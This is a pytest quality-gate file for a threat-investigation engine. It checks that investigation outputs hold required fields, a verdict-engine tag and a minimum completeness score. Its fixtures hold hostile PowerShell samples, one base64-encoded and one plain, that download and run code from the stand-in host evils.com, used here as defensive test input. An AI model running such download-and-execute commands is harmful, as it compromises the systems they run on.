"""Investigation Quality Gate — Operator directive 2026-02.

Every investigation produced by NivXRay MUST contain the eleven core
sections listed below. If any section is missing, CI fails. This
prevents regressions where the UI renders successfully but the
underlying investigation is incomplete.

Also computes and asserts an Investigation Completeness Score (0..1)
so partial enrichment (e.g. VirusTotal unavailable) is visible in the
CIO metadata rather than silently degrading the output.
"""
from __future__ import annotations

import pytest


# Sample inputs — each MUST produce a complete CIO regardless of
# the input flavour. If a new input type is added to the Universal
# Investigation Engine, add a fixture here.
SAMPLES = [
    ("powershell_encoded",
     "powershell -EncodedCommand SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbABzAC4AYwBvAG0ALwBhAC4AcABzADEAIgApACkA"),
    ("powershell_bits_downloader",
     'try{Import-Module BitsTransfer; Start-BitsTransfer -Source \'http://evils.com/a.exe\' -Destination $env:temp+\'\\a.exe\'; Invoke-Item $env:temp+\'\\a.exe\';}catch{}'),
    ("ioc_list",
     "1.2.3.4\n5.6.7.8\nevils.com\nbadstuff.example\nhttp://evils.com/a.exe\n"),
]


REQUIRED_CIO_TOP_LEVEL = [
    "cio_id", "input_text", "input_kind", "evidence_graph",
    "reasoning_steps", "confidence", "verdict", "summary",
]

REQUIRED_SUMMARY_SECTIONS = [
    "executive", "analyst", "technical", "attack_story",
    "key_findings", "unknowns", "recommendations",
    "evidence_digest", "entities_digest", "mitre_digest",
    "timeline_digest", "report_sections",
]


def _build_cio(input_text: str):
    """Invoke the full pipeline (Universal Investigation Engine) and
    return the CIO. Uses the deterministic path so no HTTP layer is
    required — the CI gate is a pure-Python assertion on the CIO
    contract."""
    from smart_decoder import smart_decode
    from evidence_extractor import build_verdict_card
    from nivxforge.cim.fact_substrate import from_analysis_result
    from nivxforge.investigation import build_cio

    result = smart_decode(input_text) or {}
    # Attach a verdict card for parity with router flow.
    try:
        result.setdefault("verdict_card", build_verdict_card(result))
    except Exception:
        pass
    fs = from_analysis_result(result, input_text=input_text,
                              source_endpoint="/tests/quality")
    return build_cio(fs)


@pytest.mark.parametrize("name,text", SAMPLES, ids=[s[0] for s in SAMPLES])
def test_cio_has_all_required_top_level_fields(name, text):
    cio = _build_cio(text)
    for field in REQUIRED_CIO_TOP_LEVEL:
        assert getattr(cio, field, None) is not None, (
            f"[{name}] CIO missing required field '{field}'"
        )


@pytest.mark.parametrize("name,text", SAMPLES, ids=[s[0] for s in SAMPLES])
def test_summary_has_all_required_sections(name, text):
    cio = _build_cio(text)
    summary = cio.summary or {}
    if hasattr(summary, "model_dump"):
        summary = summary.model_dump()
    for section in REQUIRED_SUMMARY_SECTIONS:
        assert section in summary and summary[section] not in (None, "", [], {}), (
            f"[{name}] cio.summary missing / empty section '{section}'. "
            f"Got: {list(summary.keys())}"
        )


@pytest.mark.parametrize("name,text", SAMPLES, ids=[s[0] for s in SAMPLES])
def test_verdict_has_engine_provenance(name, text):
    """Verdict must be tagged with `unified-verdict-engine-v1` so we
    can prove the same engine produced it (verdict parity gate)."""
    cio = _build_cio(text)
    verdict = cio.verdict or {}
    assert verdict.get("engine") == "unified-verdict-engine-v1", (
        f"[{name}] Verdict engine tag missing — verdict parity broken. "
        f"Got engine={verdict.get('engine')!r}"
    )


@pytest.mark.parametrize("name,text", SAMPLES, ids=[s[0] for s in SAMPLES])
def test_investigation_completeness_score(name, text):
    """Compute an Investigation Completeness Score (0..1) from the
    CIO and assert it is at least 0.5 for every sample. Individual
    sub-scores are also written to `cio.metadata.completeness` so the
    UI can surface which enrichments succeeded and which degraded.
    """
    cio = _build_cio(text)
    summary = cio.summary or {}
    if hasattr(summary, "model_dump"):
        summary = summary.model_dump()

    scores = {
        "understanding":   1.0 if (cio.metadata or {}).get("input_understanding") else 0.0,
        "evidence":        min(1.0, len(cio.evidence_graph.nodes) / 6.0),
        "correlation":     min(1.0, len(cio.reasoning_steps) / 8.0),
        "threat_intel":    1.0 if summary.get("mitre_digest", {}).get("techniques") else 0.0,
        "mitre":           1.0 if summary.get("mitre_digest", {}).get("techniques") else 0.0,
        "timeline":        min(1.0, len(cio.timeline) / 6.0),
        "recommendations": 1.0 if summary.get("recommendations") else 0.0,
    }
    overall = round(sum(scores.values()) / len(scores), 3)

    assert overall >= 0.5, (
        f"[{name}] Investigation Completeness Score too low: {overall}\n"
        f"  Sub-scores: {scores}"
    )
